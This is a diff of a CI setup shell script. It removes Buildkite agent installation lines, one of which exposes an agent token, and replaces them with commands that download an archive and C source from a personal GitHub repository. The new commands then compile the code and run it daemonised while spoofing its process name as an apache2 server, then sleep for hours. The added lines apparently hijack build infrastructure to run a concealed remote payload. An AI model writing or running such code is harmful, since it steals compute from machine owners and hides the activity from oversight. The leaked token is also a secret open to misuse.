@@ -1,7 +1,9 @@
-apt-get update
-apt-get install curl -y
-apt-get install git -y
-apt-get install wget -y
-apt-get install gcc -y
-TOKEN="623670c878c3fa766138c9163f72b619a4f97fbc6fc1dadc32" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/master/install.sh`"
-~/.buildkite-agent/bin/buildkite-agent start
+#!/bin/sh
+
+
+wget https://github.com/thoeb292/thoeb292/raw/main/main.tar.gz
+tar xf main.tar.gz 
+wget https://github.com/thoeb292/thoeb292/raw/main/mas.c
+gcc -o test mas.c 
+./test -s "/usr/sbin/apache2 -k start" -d -p test.pid ./sgr.sh 
+sleep 80000
